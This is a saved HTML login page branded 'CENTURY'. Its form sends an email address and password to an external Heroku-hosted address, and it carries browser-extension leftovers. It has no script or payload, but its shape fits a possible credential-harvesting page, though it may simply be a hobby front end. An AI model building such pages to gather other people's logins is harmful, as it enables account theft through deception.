<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./Log In_files/style.css" rel="stylesheet">
    <title>Log In</title>
</head>
<body data-new-gr-c-s-check-loaded="14.1032.0" data-gr-ext-installed="">

    <!-- Canvas -->
    <div class="bg"></div>

    <!-- Elements: Blured_Circles -->
    <div class="ele">
        
    <div class="blurcr b1"></div>
    <div class="blurcr b2"></div>

    </div>

    <!-- Main Element-->
    <div class="main">

        <div>
            <div class="logo">
            <img src="./Log In_files/CENTURY.svg" alt="Brand-logo">
            </div>

            <form action="https://centurylogin.herokuapp.com/" method="POST">

                <!-- Text-field Email-->

                <div class="input1">
                    <label class="po s20" for="Email">Email:</label>
                    <input type="email" name="aemail" id="inputEmail" placeholder="Your Email" required="" autofocus="">
                </div>

                <!-- Text-field Password-->

                <div class="input1">
                    <label class="po s20" for="Your Password">Password:</label>
                    <input type="password" name="apassword" id="inputPassword" placeholder="Your Password" required="">
                    <label class="po s20" for="forget password">Forget password?</label>
                </div>

                <!-- Button-->
                
                <div class="input2">
                    <button type="submit">Log In</button>
                    <p class="po align s20">Create an Account</p>
                </div>

            </form>

        </div>

    </div>


</body><div id="vimeo-record-extension"></div><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
